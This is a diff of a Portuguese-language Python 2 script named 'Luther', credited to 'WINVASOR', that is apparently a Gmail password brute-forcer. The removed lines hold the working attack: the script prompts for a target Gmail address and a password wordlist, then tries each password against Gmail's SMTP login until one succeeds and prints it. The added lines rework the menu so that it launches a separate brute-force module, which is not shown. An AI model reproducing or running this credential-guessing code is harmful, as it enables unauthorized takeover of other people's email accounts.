@@ -1,56 +1,42 @@
+#!/usr/bin/python2
 
-#!/usr/bin/python
 '''CRIADO POR WINVASOR'''
-
+ 
+import re
+import sys,os
+import random
 import smtplib
 from os import system
 
+A = '\033[33m'
+AZ = '\033[31m'
+NEGRI = '\033[1m'
+NOR = '\033[0;0m'
+   
 def main():
+   
    system('clear')
-   print '================================================='
-   print '               CRIADO POR WINVASOR               '
-   print '===================  2019  ======================'
-   print '  ____            __  ___                   '
-   print ' |    |    __ ___/  |_|  |__   ___________  ' 
-   print ' |    |   |  |  \   __\  |  \_/ __ \_  __ \ '
-   print ' |    |___|  |  /|  | |   Y  \  ___/|  | \/ '
-   print ' |_______ \____/ |__| |___|  /\___ \|__|    '
-   print '         \/                \/     \/     1.0'
+   print NEGRI+A+'================================================'
+   print '               CRIADO POR'+AZ+' WINVASOR'+A
+   print '===================  2019  ====================='
+   print '   ____            __  ___                   '
+   print '  |    |    __ ___/  |_|  |__   ___________  ' 
+   print '  |    |   |  |  \   __\  |  \_/ __ \_  __ \ '
+   print '  |    |___|  |  /|  | |   Y  \  ___/|  | \/ '
+   print '  |_______ \____/ |__| |___|  /\___ \|__|    '
+   print '          \/                \/     \/     1.1'
 
 main()
-print '[1] INICIAR LUTHER'
-print '[2] SAIR\n'
-OPICAO = input('==>')
-if OPICAO == 1:
-   file_path = raw_input('INSIRA A WORDLIST :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('GMAIL DO ALVO :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print '\n'
-         print '[+] A CONTA JA ERA > :' + password
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            main()
-            print '[+] A CONTA JA ERA :' + password
 
-            break
-         else:
-            print '[!] SENHA NAO EXISTE => ' + password
-login()
+print '[1] LUTHER-GMAIL'
+print '[0] SAIR\n'
+OPCAO = input('==>')
+
+if OPCAO == 1:
+   system('python2 libs/brute.py')
+
+elif OPCAO == 0:
+   print AZ+'\nADEUS!!!'+NOR
+   exit()
+else:
+   print AZ+'\n#404 NOT FOUND'+NOR
